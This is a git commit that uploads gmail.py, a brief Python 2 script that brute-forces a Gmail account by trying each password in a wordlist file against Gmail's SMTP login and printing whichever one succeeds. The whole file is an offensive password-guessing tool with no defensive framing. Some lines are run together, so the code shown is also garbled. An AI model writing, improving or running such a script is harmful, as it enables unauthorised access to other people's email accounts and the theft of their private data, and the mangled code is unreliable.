764af02d103c0d16f8083e8a91dbc6b30a00b594
U-MYTEST <72102810+U-MYTEST@users.noreply.github.com>
2021-02-10 10:49:07 +0100

    Add files via upload

---
+++ gmail.py
@@ -0,0 +1,12 @@
+import smtplib
+smtpserver=smtplib.SMTP("smtp.gmail.com",587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+user=raw_input("Enter gmail: ")
+passwfile=raw_input("Enter wordlists")                          passwfile=open(passwfile,"r")
+for password in passwfile:                                              try:
+                smtpserver.login(user, password)
+                print "[*] password found: %s" % password
+                break;
+        except smtplib.SMTPAuthenticationError:
